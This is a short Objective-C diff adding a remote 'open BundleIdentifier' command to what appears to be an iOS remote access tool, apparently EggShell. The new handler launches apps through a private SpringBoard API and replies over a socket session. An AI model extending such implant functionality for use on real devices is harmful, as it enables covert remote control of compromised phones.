@@ -482,6 +482,28 @@ int sockfd;
     [self sendString:apps:_skey];
 }
 
+-(void)launchApp:(NSArray *)args {
+    if ([args count] >= 2) {
+        int ret;
+        CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [args[1] UTF8String], kCFStringEncodingUTF8);
+        assert(identifier != NULL);
+        
+        ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
+        
+        if (ret != 0) {
+            [self sendString:@"Cannot open app, is device locked?":_skey];
+            return;
+        }
+        
+        CFRelease(identifier);
+        [self blank];
+    }
+    else {
+        [self sendString:@"Usage: open BundleIdentifier":_skey];
+    }
+
+}
+
 //MARK: EggShell Pro
 
 -(void)mcSendNoReply:(NSString *)message {
